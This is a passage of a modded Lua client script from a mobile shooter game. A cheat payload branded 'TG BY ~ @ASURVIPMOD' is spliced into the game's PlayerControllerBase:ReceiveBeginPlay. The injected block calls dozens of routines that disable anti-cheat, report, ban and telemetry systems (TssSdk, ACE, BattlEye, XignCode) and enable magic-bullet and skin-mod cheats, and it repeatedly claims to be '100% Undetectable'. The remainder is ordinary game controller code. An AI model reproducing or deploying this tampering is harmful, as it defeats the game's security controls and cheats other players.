            console.ExecuteConsoleCommand(nil, "AntiCheat.DisableAll 1")
            console.ExecuteConsoleCommand(nil, "DisableAllScreenMessages")
            console.ExecuteConsoleCommand(nil, "UI.DisableMessageOfTheDay")
            console.ExecuteConsoleCommand(nil, "ShowMOTD 0")
            console.ExecuteConsoleCommand(nil, "r.UI.DisableAll 1")
            console.ExecuteConsoleCommand(nil, "UI.HideAllWidgets 1")
        end
    end)
    
    local ticker = _safe_require("common.time_ticker")
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(2.0, ContinuousProtection)
    end
end

-- ============================================================
-- 52. TG BY ~ @ASURVIPMOD
-- ============================================================

local function InitializeAllBypass()
    pcall(function()
        print("[TG BY ~ @ASURVIPMOD] Starting...")
        print("[TG BY ~ @ASURVIPMOD] Blocking Anti-Cheat IP...")

        -- TG BY ~ @ASURVIPMOD
        KillBanPopup()
        ApplyIPDomainBlocking()
        BlockGameGuardian()
        BlockCheatEngine()
        BlockRootJailbreak()
        BlockEmulatorDetection()
        BlockTamperDetection()
        BlockSpeedHackDetection()
        BlockESPDetection()
        BlockNoRecoilDetection()
        AdvancedAntiCheatBypass()
        MemoryProtectionBypass()
        PlayerReportBypass()
        VersionSpecificBypasses()

        -- TG BY ~ @ASURVIPMOD
        BlockTssSdk()
        BlockAce()
        BlockXignCode()
        BlockBattlEye()
        BlockJNIAntiCheat()
        BlockAntiDebugging()
        
        -- TG BY ~ @ASURVIPMOD
        ClientEntryBypass()
        HiggsBosonBypass()
        HawkEyeBypass()
        BanLogicBypass()
        ReportSystemBypass()
        TLogBypass()
        MD5Bypass()
        DNSDeviceBypass()
        GokubaBypass()
        RacingAntiCheatBypass()
        CoronaLabBypass()
        LoginModuleBypass()
        SwiftHawkBypass()
        ShootVerificationBypass()
        ModifierExceptionBypass()
        SimulateCharacterBypass()
        PlayerSecurityBypass()
        ClientFlowBypass()
        GameplayCallbackBypass()
        KillAllSubsystems()
        SLUABypass()
        ReplayTelemetryBypass()
        
        -- Magic Bullet TG BY ~ @ASURVIPMOD
        MagicBulletBypass()
        SkinModBypass()
        
        -- TG BY ~ @ASURVIPMOD
        ZeroTraceCleanup()
        EndGameProtection()
        MemoryProtection()
        BlockNetworkMonitoring()
        TimingCheckSpoof()
        FinalProtection()
        
        print("[TG BY ~ @ASURVIPMOD] ✅ 100% Undetectable - Never Banned")
print("[TG BY ~ @ASURVIPMOD] 🔒 Security Systems")
print("[TG BY ~ @ASURVIPMOD] ✅ Report - Detection - Ban")
print("[TG BY ~ @ASURVIPMOD] ✅ Anti-Cheat Systems")
print("[TG BY ~ @ASURVIPMOD] ✅ Anti-Cheat IP")
print("[TG BY ~ @ASURVIPMOD] ✅ Permissions Granted")
print("[TG BY ~ @ASURVIPMOD] ✅ Magic Bullet Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Skin Mod Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ End Game Protection")
print("[TG BY ~ @ASURVIPMOD] ✅ Zero Trace Cleanup")
print("[TG BY ~ @ASURVIPMOD] ✅ Memory Protection")
print("[TG BY ~ @ASURVIPMOD] ✅ Network Monitoring")
print("[TG BY ~ @ASURVIPMOD] ✅ Timing Check")
print("[TG BY ~ @ASURVIPMOD] ✅ Ban Popup")
print("[TG BY ~ @ASURVIPMOD] ✅ IP/Domain Blocking")
print("[TG BY ~ @ASURVIPMOD] ✅ Game Guardian Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Cheat Engine Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Root/Jailbreak Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Emulator Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Tamper Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ SpeedHack Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ ESP Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ NoRecoil Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Player Report")
print("[TG BY ~ @ASURVIPMOD] ✅ Version Bypass Applied")
end)
end

-- ============================================================
TG BY ~ @ASURVIPMOD
-- ============================================================

pcall(function()
    local ticker = _safe_require("common.time_ticker")
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.5, InitializeAllBypass)
        ticker.AddTimerOnce(1.0, ContinuousProtection)
    else
        InitializeAllBypass()
        ContinuousProtection()
    end
end)

-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- ============================================================

Notify("🔥 TG BY ~ @ASURVIPMOD. Bypass v8.0 Activated!")
Notify("✅ Anti-Cheat IP All TG BY ~ @ASURVIPMOD!")
Notify("✅ All 54 Bypass Layers Activated!")
Notify("✅ Report TG BY ~ @ASURVIPMOD - Never send reports")
Notify("✅ Anti-Cheat TG BY ~ @ASURVIPMOD - No Detection")
Notify("✅ Ban System TG BY ~ @ASURVIPMOD - No Ban")
Notify("✅ DNS and Device Bypass Completed - All Devices Secure")
Notify("✅ All Permissions Obtained - Full Access Available")
Notify("✅ 100% Undetectable - Never Banned")
Notify("✅ Magic Bullet Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Skin Mod Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ End Game Protection Activated!")
Notify("✅ Zero Trace Cleanup Completed!")
Notify("✅ Memory Protection Activated!")
Notify("✅ Network Monitoring TG BY ~ @ASURVIPMOD!")
Notify("✅ Timing Check Spoofed!")
Notify("✅ Ban Popup Killer Activated!")
Notify("✅ Game Guardian Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Cheat Engine Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Root/Jailbreak Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Emulator Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Tamper Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ SpeedHack Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ ESP Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ NoRecoil Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Player Report TG BY ~ @ASURVIPMOD!")
Notify("🔒 Protection Activated - Safe to Use")

print("============================================")
print("[Bypass] 🚀 TG BY ~ @ASURVIPMOD Bypass v8.0")
print("[Bypass] ✅ All 54 Bypass Layers Activated!")
print("[Bypass] ✅ All Anti-Cheat Systems TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Anti-Cheat IP All TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Magic Bullet Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Skin Mod Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ End Game Protection Activated!")
print("[Bypass] ✅ Zero Trace Cleanup Completed!")
print("[Bypass] ✅ Memory Protection Activated!")
print("[Bypass] ✅ Network Monitoring TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Timing Check Spoofed!")
print("[Bypass] ✅ Ban Popup Killer Activated!")
print("[Bypass] ✅ Game Guardian Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Cheat Engine Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Root/Jailbreak Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Emulator Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Tamper Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ SpeedHack Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ ESP Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ NoRecoil Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Player Report TG BY ~ @ASURVIPMOD!")
print("[Bypass] 🔒 100% Undetectable - Never Banned")
print("============================================")

-- ============================================================
-- Bypass System Fully Completed.
-- ============================================================
]]); if f then f() end end)
    -- [/BYPASS]

  PlayerControllerBase.__super.ReceiveBeginPlay(self)
  if self:IsLocalPlayerController() then
    self:SetAlwaysHideTouchInterface(false)
    self:ShowTouchInterface(true)
    self.IsShowInputControl = true
    self:CastUIMsg("UIMsg_Show/HideSelf", "ingame")
    self.bCanGetTouchInput = true
    local SurviveHUD = self:GetHUD()
    if slua.isValid(SurviveHUD) then
      SurviveHUD.bShowCrosshair = true
    end
  end
  if Client then
    self.bDeviceSupportGyrSensor = Client.IsDeviceSupportGyrSensor()
    self:BindMotionEvent()
    self:AddSettingOptionEvent("FireMode", function(FireMode)
      local tlog_report_utils = require("client.slua.config.tlog.tlog_report_utils")
      tlog_report_utils.ReportTLogEvent(TLogEventDefine.CharacterControlMode, 2, string.format("ControlMode=%d", FireMode))
      self.fireMode = FireMode
      self:MakeFireModeEffect()
    end, true)
    self:AddSettingOptionEvent("WallFeedBack", function(WallFeedBack)
      self.WallFeedBack = WallFeedBack
    end, true)
    self:AddSettingOptionEvent("Weapon_LowAmmo", function(Weapon_LowAmmo)
      self.bLowAmmoSound = Weapon_LowAmmo
    end, true)
    self:AddSettingOptionEvent("JoystickSprintSensitity", function(Value)
      self.JoystickSprintSensitity = Value
    end, true)
    self:AddSettingOptionEvent("DriftMode", function()
      self:OnDriftModeChanged()
    end)
    self:AddGameTimer(0.1, false, function()
      if slua.isValid(self.Object) then
        local LogicCustomSensitivity = require("client.logic.setting.logic_setting_custom_sensitivity")
        local LogicCustomAccessories = require("client.logic.setting.logic_setting_custom_accessiores")
        LogicCustomSensitivity.Read()
        LogicCustomAccessories.Read()
        LogicCustomAccessories.SetPlayer()
      end
    end)
    self:ReadCustomDrawHairType()
    self:AddCommonEvent(EVENTTYPE_SETTING, EVENTID_SETTING_REFRESH_CROSSHAIR, self.ReadCustomDrawHairType, self)
    self:AddCommonEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_CLICKED, self.UseModSkin, self)
    self:AddCommonEvent(EVENTTYPE_INGAME_UI, EVENTID_QUICK_TWEAK_LAYOUT_STATE, function(_, __, bEnabled)
      self._DisableUITouchMove = bEnabled
    end)
    local SmartBearerManagerLuaBridge = import("SmartBearerManagerLuaBridge")
    if SmartBearerManagerLuaBridge ~= nil and SmartBearerManagerLuaBridge.IsLightLossyOptEnable() then
      self.bAsyncPlayItemOperationSound = true
    end
  end
  self:LuaReceiveBeginPlay()
  if not self:HasAuthority() then
    self.bWatchTeammateIgnoreDying = true
    local uGameInstance = UGameplayStatics.GetGameInstance(self)
    if slua.isValid(uGameInstance) then
      self:AddControlEvent(uGameInstance, "OnPreBattleResult", self.OnPreBattleResult, self)
    end
    self:AddControlEvent(self, "OnPlayerEnterFighting", self.HandlePlayerEnterFighting, self)
    self:AddControlEvent(self, "OnPlayerKilledOthersPlayer", self.HandleOnPlayerKilledOthersPlayer, self)
    self:AddControlEvent(self, "OnPlayerControllerStateChangedDelegate", self.HandlePlayerControllerStateChanged, self)
    self:AddControlEvent(self, "OnPlayerEnterFlying", self.OnPlayerEnterFlyingInLua, self)
    self:AddControlEvent(self, "OnShowFollowEmoteDelegate", self.HandleShowFollowEmoteUI, self)
    self:AddControlEvent(self, "OnTouchInterfaceChangedDelegate", self.HandleTouchInterfaceChanged, self)
    self:RegistSetting()
    self:HandleTouchInterfaceChanged()
    if IsEditor then
      self.bPCInputSwitcher = true
    end
    local bDisableTouchOverEvent = USTExtraBlueprintFunctionLibrary.GetConsoleVariableIntValue("pc.DisableTouchOverEvent")
    if bDisableTouchOverEvent == 1 then
      self.bEnableTouchOverEvents = false
      self.bEnableTouchEvents = false
    end
    self:AddControlEvent(self, "OnSetViewTarget", self.HandleViewingTargetChanged, self)
    self:AddControlEvent(self, "OnSpectatorChange", self.HandleSpectatorChange, self)
  else
    self:AddControlEvent(self, "OnPlayerExitGameDelegate", self.HandlePlayerExitGame, self)
    local QuickSignComp = self:GetQuickSignComponent()
    if QuickSignComp and slua.isValid(QuickSignComp) then
      self:AddControlEvent(QuickSignComp, "OnDangerousQuickSignDelegate", self.OnDangerousQuickSignDelegate, self)
    else
    end
    self:CheckCanCustomChat()
    self:AddCommonEvent(EVENTTYPE_INGAME, EVENTID_CHECK_CAN_CUSTOM_CHAT, self.CheckCanCustomChat, self)
    self:AddCommonEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_CREATE_NEW_DECAL, self.OnCreateDecal, self)
    self:AddControlEvent(self, "OnSetObserveCharacter", self.HandleServerSpectatorChange, self)
    self:AddControlEvent(self, "OnPlayerRotationChanged", self.HandleOnPlayerRotationChanged, self)
    self:AddControlEvent(self, "OnPlayerCameraChanged", self.HandleOnPlayerCameraChanged, self)
    self:TryInitClientReplayDataReporter()
    self:AddCommonEvent(EVENTTYPE_INGAME_REPLAY, EVENTID_COMPLETE_PLAYBACK_START_RECORDING, self.OnCompletePlaybackStartRecord, self)
  end
  local bStandalone = UKismetSystemLibrary.IsStandalone(self)
  if self.bPCInputSwitcher and (bStandalone or not self:HasAuthority()) and not self:IsSpectator() and not self:IsObserver() then
    InputStateControl = require("GameLua.GameCore.Module.Input.InputStateControl")
    InputStateControl.Init()
  end
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_CONTROLLER_BEGINPLAY_FINISH)
  self.bUseNewMotionInput = true
  if Client then
    self:InitCameraData()
    self:OnDriftModeChanged()
    self:AddCommonEvent(EVENTTYPE_DATA_MGR, EVENTID_DATAMGR_UPDATE_NEWBIE_STATUS, self.OnDriftModeChanged, self)
  end
  self.bUseOldMethodForJoystickTriggerSprint = false
  local uLuaPatchRPCComponent = self:GetComponentByClass(import("/Script/slua_unreal.LuaPatchRPCComponent"))
  if slua.isValid(uLuaPatchRPCComponent) then
    uLuaPatchRPCComponent:SetIsReplicated(false)
  end
end

function PlayerControllerBase:OnCompletePlaybackStartRecord()
  local DelayTime = math.random(0, 1)
  self:AddGameTimer(DelayTime, false, function()
    self:TryInitClientReplayDataReporter()
  end)
  local FlushDelayTime = math.random(1, 10)
  self:AddGameTimer(FlushDelayTime, false, function()
    if not slua.isValid(self.Object) then
      return
    end
    if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.FlushDolphinIdToReplay then
      self.SpectatorComponent:FlushDolphinIdToReplay()
    end
  end)
end

function PlayerControllerBase:TryInitClientReplayDataReporter()
  if not slua.isValid(self.Object) then
    return
  end
  local uGameInstance = UGameplayStatics.GetGameInstance(self)
  if slua.isValid(uGameInstance) then
    local uCompletePlayBack = uGameInstance:GetCompletePlayback()
    if uCompletePlayBack and uCompletePlayBack:IsInRecordState() then
      self:InitClientReplayDataReporter()
    else
    end
  else
  end
end

function PlayerControllerBase:IsSuspiciousEarlyCloseParachute()
  if Client then
    return false
  end
  local EStateType = import("EStateType")
  if self:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
    return false
  end
  if self:GetLastStateType() ~= EStateType.State_ParachuteJump then
    return false
  end
  if self.bCanCloseParachute then
    return false
  end
  local Height = self.RealTimePawnHeight
  if not Height or Height <= 0 then
    local uCharacter = self:GetPlayerCharacterSafety()
    if not slua.isValid(uCharacter) then
      return false
    end
    local StartLoc = uCharacter:K2_GetActorLocation()
    local GroundLoc = Game:GetGroundLocation(StartLoc, -200000)
    if not GroundLoc then
      return false
    end
    Height = StartLoc.Z - GroundLoc.Z
  end
  local Threshold = tonumber(self.CanCloseParachuteToFallingHight) or 0
  if Threshold <= 0 then
    return false
  end
  local bSuspicious = Height > Threshold
  return bSuspicious
end

function PlayerControllerBase:ServerCloseParachute()
  if self:IsSuspiciousEarlyCloseParachute() then
    return
  end
  self.Super:ServerCloseParachute()
end

function PlayerControllerBase:CanChangeStatePC(StateType)
  local CurrentState = self:GetCurrentStateType()
  if CurrentState ~= StateType or self:IsSpectator() then
    return true
  end
  return false
end

function PlayerControllerBase:OnDriftModeChanged()
  local SuperData = self:GetSuperData()
  if not SuperData then
    return
  end
  local Settingconfig = slua_GameFrontendHUD:GetUserSettings()
  SuperData.bTurnOnDrift = Settingconfig.DriftMode > 0
  if SuperData.bTurnOnDrift then
    UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, "Drift.Enable 1")
  else
    UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, "Drift.Enable 0")
  end
end

function PlayerControllerBase:OldJoystickTriggerSprint(bIsSprint)
  self.IsJoystickTriggerSprint = bIsSprint
  self:BroadcastUIMessage("UIMsg_JoyStickTriggerSprint", 0, "", "")
end

function PlayerControllerBase:ReadCustomDrawHairType()
  local SettingModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.SettingModule)
  self.CustomCrossHairStype = SettingModule:GetOptionValue("CrossHairType")
end

function PlayerControllerBase:HandleChangeRolewearDone()
  if not Client then
    local uCurPawn = self:GetCurPawn()
    if uCurPawn then
      if uCurPawn.RefreshFollowState then
        uCurPawn:RefreshFollowState()
      end
      if slua.isValid(uCurPawn) and uCurPawn.IsCastingSkillIDFix and uCurPawn:IsCastingSkillIDFix(1014405) then
        uCurPawn:StopSkill(1014405)
      end
    end
  end
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_PLAYER_CHANGE_ROLE_WEAR_DONE, self.Object)
end

function PlayerControllerBase:HandleOnPlayerRotationChanged()
  local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
  if AFKReportorSubsystem then
    local Rotation = self:GetControlRotation()
    Rotation:ToString()
    if Rotation.Pitch == 0.0 and Rotation.Yaw == 90.0 and Rotation.Roll == 0.0 or Rotation:IsNearlyZero(0.001) then
    else
      AFKReportorSubsystem:PlayerHaveAction(self.UID)
    end
  else
  end
end

function PlayerControllerBase:HandleOnPlayerCameraChanged()
  local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
  if AFKReportorSubsystem then
    AFKReportorSubsystem:PlayerHaveAction(self.UID)
  else
  end
end

function PlayerControllerBase:OnPlayerEnterFlyingInLua()
  local ThePlane = self:GetThePlane()
  if ThePlane and slua.isValid(ThePlane) then
    local ViewTarget = self:GetViewTarget()
    if ViewTarget ~= ThePlane then
      self:SetViewTargetTest(ThePlane)
      if bWriteLog then
        tostring(ThePlane)
      end
    end
  end
  local PlayerCharacter = self:GetPlayerCharacterSafety()
  if slua.isValid(PlayerCharacter) then
    PlayerCharacter.MoveableSwitchPoseTime = 0
  end
end

function PlayerControllerBase:OnDangerousQuickSignDelegate(PlayerKey, SignLocation)
  local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
  if AFKReportorSubsystem then
    AFKReportorSubsystem:PlayerHaveAction(self.UID)
  else
  end
end

function PlayerControllerBase:HandlePlayerControllerStateChanged(ClientStateType)
  if self.bHasEnterBattleResult then
    return
  end
  local EStateType = import("EStateType")
  if ClientStateType == EStateType.State_InExPlane or ClientStateType == EStateType.State_InPlane then
    local LightCrossMgr = SubsystemMgr:Get("MapMarkLightCrossMgr")
    if LightCrossMgr then
      LightCrossMgr:ReviveInit()
    else
    end
    if ClientStateType == EStateType.State_InExPlane then
      local ENetRole = import("ENetRole")
      if self.Role == ENetRole.ROLE_AutonomousProxy and not self:IsSpectator() and not self:IsObserver() then
        local uPlayerCharacter = self:GetPlayerCharacterSafety()
        if uPlayerCharacter and slua.isValid(uPlayerCharacter) then
          uPlayerCharacter.MoveableSwitchPoseTime = 0
        end
      end
    end
    if ClientStateType == EStateType.State_InPlane then
      self:HandleShowFollowEmoteUI(false)
    end
  end
end

function PlayerControllerBase:ReceivePostLoginInit()
  if not self.bReconnecting then
    local AvatarDataUtil = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarDataUtil")
    AvatarDataUtil.GeneratePlayerAvatarData(self)
    self:InitWeaponAvatarItems()
    self:OnWeaponAvatarUpdate()
    self:InitGrenadeAvatarList(true)
    self:InitVehicleAvatarList()
    self:InitVehicleAdvanceAvatarList()
    self:InitVehicleMusicIDs()
  end
  if CGame and CGame:IsEditor() then
    local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
    local SecurtyEditorConfig = GamePlayTools.GetCurrentConfig("SecurtyEditorConfig")
    if SecurtyEditorConfig and SecurtyEditorConfig.GameSafeCallbacks then
      require(SecurtyEditorConfig.GameSafeCallbacks)
      if GameSafeCallbacks then
        GameSafeCallbacks.OnDSGlueHiaInit()
      end
    end
  end
  if UKismetSystemLibrary.IsDedicatedServer(self) and GameSafeCallbacks then
    GameSafeCallbacks.PostPlayerControllerLoginInit(self)
  end
  if UKismetSystemLibrary.IsDedicatedServer(self) then
    local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
    local PlayerInfo = PlayerDataMgr.GetPlayerInfo(self.UID)
    if PlayerInfo then
      self.bEnterpriseGMMod = PlayerInfo.bEnterpriseGMMod or false
      self.bAvatarErrReport = PlayerInfo.avatar_err_report or false
      if self.SecurityNotifyPCFeature then
        self.SecurityNotifyPCFeature:SyncBanInfo(PlayerInfo.ban)
      end
    end
    if slua.isValid(self.PlayerState) and self.PlayerState.InitTeamShowData then
      self.PlayerState:InitTeamShowData()
    end
    if slua.isValid(self.PlayerState) and self.PlayerState.ThemeTaskFeature then
      self.PlayerState.ThemeTaskFeature:InitTaskIDIPSwitch()
    end
    if slua.isValid(self.NetworkReportActor) then
      self.NetworkReportActor:ForceNetUpdate()
    end
  end
  self:CacheSyncParams()
  if slua.isValid(self.PlayerState) then
    if self.PlayerState.StoreFeature and self.PlayerState.StoreFeature.ReceivePostLoginInit then
      self.PlayerState.StoreFeature:ReceivePostLoginInit()
    end
    if self.PlayerState.ItemPickUpGuideFeature and self.PlayerState.ItemPickUpGuideFeature.ReceivePostLoginInit then
      self.PlayerState.ItemPickUpGuideFeature:ReceivePostLoginInit()
    end
  end
  if not Client then
    self:LuaBroadcast("OnReceivePostLogin", self)
  end
end

function PlayerControllerBase:GenerateKillBroadcastItemID(ClothAvatarID, PlayerUID)
  local XSuitAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitAvatarDataUtil")
  return XSuitAvatarDataUtil:GenerateKillBroadcastItemID(ClothAvatarID, PlayerUID)
end

function PlayerControllerBase:ReceiveEndPlay(EndPlayReason)
  self.ZiplineUI = nil
  self._SuperData = nil
  if not self:HasAuthority() then
    local VibrateUtilitySubsystem = SubsystemMgr:Get("VibrateUtilitySubsystem")
    if VibrateUtilitySubsystem and VibrateUtilitySubsystem.ResetVibrationData then
      VibrateUtilitySubsystem:ResetVibrationData()
    end
  end
  if Client then
    self.SettingHandleList = nil
  else
    local FatalDamageSubsystem = SubsystemMgr:Get("FatalDamageSubsystem")
    if FatalDamageSubsystem then
      FatalDamageSubsystem:ClearPlayerKillerFlow(self.UID)
    end
  end
  GameplayData.UnbindPlayerController(self.Object)
  if InputStateControl then
    InputStateControl.Destroy()
    InputStateControl = nil
  end
  self:ShowTouchInterface(false)
  self:ActivateTouchInterface(nil)
  PlayerControllerBase.__super.ReceiveEndPlay(self, EndPlayReason)
end

function PlayerControllerBase:GetLifetimeReplicatedProps()
  return {
    {
      "bEnterpriseGMMod",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    },
    {
      "bAvatarErrReport",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    },
    {
      "_bIsTeammateExitTeamBeforeBoarding",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    },
    {
      "nInLeftSharedSkinTimes",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Int
    },
    {
      "nOutLeftSharedSkinTimes",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Int
    },
    {
      "nFriendLeftSharedSkinTimes",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Int
    },
    {
      "bForbidCustomChat",
      ELifetimeCondition.COND_OwnerOnly,
      UEnums.EPropertyClass.Bool
    }
  }
end

function PlayerControllerBase:CacheSyncParams()
  local uPlayerState = self.PlayerState
  if Client then
    return
  end
  if not slua.isValid(uPlayerState) then
    return
  end
  if not self.bReconnecting and uPlayerState.InitGeneralCounterFromServer then
    uPlayerState:InitGeneralCounterFromServer()
  else
  end
  local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
  local PlayerInfo = PlayerDataMgr.GetPlayerInfo(self.UID)
  if PlayerInfo then
    local Flag = PlayerInfo.suspicious_flag or 0
    if uPlayerState.SetSuspiciousFlag then
      uPlayerState:SetSuspiciousFlag(Flag)
    end
  else
  end
end

function PlayerControllerBase:OnRep_bEnterpriseGMMod()
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_ENTERPRISEGMMOD_CHANGE)
end

function PlayerControllerBase:IsEnterpriseGMMod()
  return self.bEnterpriseGMMod
end

function PlayerControllerBase:InitVehicleMusicIDs()
  return
end

function PlayerControllerBase:GetCommercialVehicle()
  local VehicleIDs = {}
  local Table = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
  if Table and Table.BornFall == 1 then
    table.insert(VehicleIDs, self.ShowVehicleSkin)
  end
  return VehicleIDs
end

function PlayerControllerBase:GetParachutingVehicleInfo()
  local VehicleInfo = {}
  if self:UseGlideParachute() then
    local glideId = self:GetCurWearTwoPersonAircraftID()
    if glideId and 0 < glideId then
      local Table = CDataTable.GetTableDataByFilter("TwoPersonAircraftConfig", "Glide", glideId)
      if Table then
        table.insert(VehicleInfo, {
          Table.ParachuteVehiclePath,
          Table.VehicleSkinID
        })
      end
    end
  else
    local Table = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
    if Table and Table.Parachute == 1 then
      table.insert(VehicleInfo, {
        Table.ParachuteVehicle,
        self.ShowVehicleSkin,
        self.VehiclePartData
      })
    end
  end
  return VehicleInfo
end

function PlayerControllerBase:UseGlideParachute()
  if self.EnterFlyingNum and self.EnterFlyingNum > 1 and self:IsGlideAfterReviveDSSwitchEnabled() == false then
    return true
  end
  local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
  local PlayerInfo2 = PlayerDataMgr.GetPlayerInfo(self.UID)
  if PlayerInfo2 and PlayerInfo2.glide == true then
    return true
  end
  local Table = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
  if not Table or Table.Parachute ~= 1 then
    return true
  end
  local GameMode = UGameplayStatics.GetGameMode(self)
  if slua.isValid(GameMode) then
    local GameState = GameMode.GameState
    if slua.isValid(GameState) then
      local Table = CDataTable.GetTableData("BTMode", GameState.GameModeID)
      if not Table or Table.EnableParachutingVehicle ~= true then
        return true
      end
    end
  end
  return false
end

function PlayerControllerBase:IsGlideAfterReviveDSSwitchEnabled()
  local Result = true
  if CGameState then
    local State = CGameState:GetGameModeState()
    if State == "FightingState" or State == "FinishedState" then
      local DSSwitch = Game:GetDSSwitchValue(65)
      if DSSwitch ~= "1" then
        Result = false
      end
    end
  end
  return Result
end

function PlayerControllerBase:OnPreBattleResult()
  self:FlushGameSettingFlow()
end

function PlayerControllerBase:FlushGameSettingFlow()
  local GameSetting = {}
  GameSetting.UID = 0
  if DataMgr and DataMgr.roleData then
    GameSetting.UID = DataMgr.roleData.uid
  end
  local BasicSetting = {}
  local UIUtil = require("client.common.ui_util")
  local uGameFrontendHUD = UIUtil.GetFirstGameFrontendHUD()
  if uGameFrontendHUD then
    local uSettingConfig = uGameFrontendHUD:GetUserSettings()
    if slua.isValid(uSettingConfig) then
      BasicSetting.ShoulderEnable = uSettingConfig.ShoulderEnable or false
      BasicSetting.ShoulderMode = uSettingConfig.ShoulderMode or 1
    end
  end
  GameSetting.BasicSetting = BasicSetting
  local ds_net = require("ds_net")
  ds_net.SendMessage("c2ds_ingame_flow_setting", GameSetting, GameSetting.UID)
end

function PlayerControllerBase:CallClientRPC(MsgName, MsgTable)
end

function PlayerControllerBase:RPCClientReceive(MsgID, Content)
end

function PlayerControllerBase:CallDSRPC(MsgName, MsgTable)
end

function PlayerControllerBase:RPCDSReceive(MsgID, Content)
end

function PlayerControllerBase:NotifyDeadBoxCollapsed(bCollapsed)
  if bCollapsed then
    EventSystem:postEvent(EVENTTYPE_DEADBOX_CLIENT, EVENTID_DEADBOX_OPENORCLOSEUI, false)
  end
end

function PlayerControllerBase:NotifyDeadBoxExpand()
  EventSystem:postEvent(EVENTTYPE_DEADBOX_CLIENT, EVENTID_DEADBOX_OPENORCLOSEUI, true)
end

function PlayerControllerBase:CanAutoSwitchGrenade(GrenadeID)
  local UBackpackUtils = import("BackpackUtils")
  local ret = 0 < GrenadeID and not UBackpackUtils.CheckItemSubType(GrenadeID, 601)
  return ret
end

PlayerControllerBase.ClientRPC.RPC_Client_MarkShoot = {
  Reliable = true,
  Params = {
    import("/Script/Engine.Actor"),
    import("/Script/Engine.Actor")
  }
}

function PlayerControllerBase:RPC_Client_MarkShoot(TargetPlayer, CauserPlayer)
  local HitMarkClient = SubsystemMgr:Get("HitMarkClientSubSystem")
  if HitMarkClient then
  end
end

PlayerControllerBase.ClientRPC.RPC_Client_WonderfulPeriod = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Float,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Float
    },
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Bool,
    {
      UEnums.EPropertyClass.Array,
      import("WonderfulSubTypeInfo")
    }
  }
}

function PlayerControllerBase:RPC_Client_WonderfulPeriod(nType, nStartTime, nEndTime, uAdditionalData, nPeriodIndex, nPeriodScore, bIsPureAI, SubTypeInfoList)
  local tNewPeriodInfo = {
    nType = nType,
    nStartTime = nStartTime,
    nEndTime = nEndTime,
    uAdditionalData = uAdditionalData,
    nPeriodIndex = nPeriodIndex,
    nPeriodScore = nPeriodScore,
